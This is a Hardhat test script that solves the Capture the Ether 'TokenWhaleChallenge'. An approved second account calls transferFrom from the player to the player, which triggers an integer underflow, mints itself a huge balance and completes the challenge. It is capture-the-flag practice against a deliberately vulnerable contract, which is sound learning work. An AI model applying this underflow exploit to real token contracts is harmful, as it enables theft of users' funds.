import { expect } from "chai";
import { ethers, network } from "hardhat";

beforeEach(async () => {
  await network.provider.send("hardhat_reset");
});

describe("TokenWhaleChallenge", function () {
  it("solves the challenge", async () => {
    const [deployer, player, solver] = await ethers.getSigners();

    // Deploy as PLAYER (so they receive 1000 tokens)
    const TokenWhale = await ethers.getContractFactory("TokenWhaleChallenge", player);
    const challenge = await TokenWhale.deploy(player.address);
    await challenge.waitForDeployment();

    // Confirm player got 1000 tokens
    const bal = await challenge.balanceOf(player.address);
    //console.log("Initial player balance:", bal.toString());
    expect(bal.toString()).to.equal("1000");

    // Player approves solver to spend their tokens
    await challenge.connect(player).approve(solver.address, 1_000_000);

    //Solver directly calls transferFrom to trigger underflow
    await challenge.connect(solver).transferFrom(player.address, player.address, 1);

    const solverBal = await challenge.balanceOf(solver.address);
    //console.log("Solver balance after underflow:", solverBal.toString());

    //Now solver has a huge balance, can send to player
    await challenge.connect(solver).transfer(player.address, 1_000_000);

    //Confirm challenge completion
    const isComplete = await challenge.isComplete();
    expect(isComplete).to.be.true;

    const final = await challenge.balanceOf(player.address);
  });
});
